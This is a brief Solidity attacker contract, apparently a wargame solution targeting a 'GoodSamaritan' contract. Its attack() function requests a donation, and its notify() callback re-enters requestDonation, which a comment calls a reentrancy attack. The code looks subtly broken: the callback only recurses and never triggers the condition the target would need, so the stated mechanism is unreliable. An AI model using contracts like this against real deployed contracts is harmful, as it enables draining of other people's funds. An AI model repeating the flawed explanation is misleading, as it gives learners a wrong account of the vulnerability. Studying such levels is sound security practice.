pragma solidity ^0.8.0;

interface GoodSamaritan {
    function requestDonation() external;
}


contract GoodSamaritanAttacker {
    GoodSamaritan instance;

    constructor(address payable samaritanInstance) {
        instance = GoodSamaritan(samaritanInstance);
    }

    function attack() external {
        instance.requestDonation();
    }

    // Implement notify as part of INotifyable
    function notify(uint256 amount) external {
        // Reentrancy attack into requestDonation again
        instance.requestDonation();
    }
}